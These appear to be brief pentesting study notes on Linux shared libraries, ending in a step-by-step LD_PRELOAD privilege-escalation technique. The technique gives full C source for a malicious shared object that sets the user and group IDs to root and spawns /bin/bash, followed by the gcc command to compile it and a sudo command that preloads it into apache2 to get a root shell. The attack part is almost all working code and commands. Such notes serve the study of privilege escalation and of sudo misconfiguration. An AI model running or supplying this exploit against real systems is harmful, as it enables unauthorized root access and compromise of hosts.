Static libraries: .a
Dynamically linked shared object libraries: .so

**Shared objects required by a binary can be viewed using the ldd utility
```shell-session
ldd /bin/ls
```
- This shows all libraries required by /bin/ls

## LD_PRELOAD Privilege Escalation

**Need a user with sudo privileges
```shell-session
sudo -l
```

**Create binary
```shell-session
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

**Compile binary
```shell-session
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

**Escalate Privileges
```shell-session
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
